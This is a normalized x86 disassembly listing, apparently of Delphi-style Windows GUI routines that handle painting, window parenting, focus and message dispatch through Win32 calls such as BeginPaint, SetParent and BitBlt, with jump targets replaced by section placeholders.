mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44119c
mov eax [ ebp - 0x8 ]
push eax
push sub_443660
mov eax [ ebp - 0x8 ]
push eax
push sub_443698
push ebp
call sub_443700
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443834
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43fc24
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408a3c
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408a50
mov ecx eax
mov edx edi
mov eax ebx
call sub_43fc34
mov eax r-xdata
call sub_408a5c
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43e6d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44388c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4438d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4438e0
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cc30
sub_4438f0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4175cc
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_417570
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_443938
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4438f0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44318c
call sub_43f304
inc edi
dec esi
jne r-xdata
sub_4439d4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4439f0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_417570
call sub_4439f0
inc edi
dec esi
jne r-xdata
sub_443a50
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_4034e4
mov ebx eax
mov eax edi
call sub_4439f0
mov eax edi
call sub_443b8c
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_443a90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_443b66
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_440e64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_417570
call sub_443a90
inc esi
dec ebx
jne r-xdata
sub_443b8c
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_443a90
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_443bcc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4439f0
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_443b8c
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406d18
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_440e64
jmp r-xdata
sub_443c54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443cac
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_443c9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443ca2
call sub_43e6d8
call sub_4249cc
retn
sub_443ccc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_416114
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406d00
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_440e64
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_443d84
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_417570
call sub_443ccc
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_417570
call sub_443ccc
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_443e18
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4464d0
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cec
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_443d84
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d00
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_440e64
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_443eac
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_440420
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_440f30
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_443e18
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cec
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43f7f4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_443d84
test eax eax
je r-xdata
mov eax ebx
call sub_456c04
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_440f30
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4464d0
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4464d0
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_440e64
sub_444010
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4410c4
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_440e64
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41ffac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_420c30
call sub_41ffac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_420c6c
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43f850
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_444118
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43cb90
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_440e64
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44414c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44426c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4442a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444273
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_417570
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_4442a4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4175cc
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_417570
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41613c
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_417570
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41ffac
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_41613c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41ffac
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41613c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43e5ec
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_440e64
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4444d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43e5ec
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4464d0
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4464d0
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_440e64
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_440e64
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43e5ec
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4444d4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_417570
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_444628
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44414c
jmp r-xdata
mov eax ebx
call sub_4431c8
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44477a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4464d0
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_440e64
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_444628
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4464d0
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_444788
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4447a8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44481c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44483c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44485c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444880
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4448a4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4448c8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_444118
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4448ec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_433194
mov edi eax
mov eax edi
call sub_433274
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_420c6c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
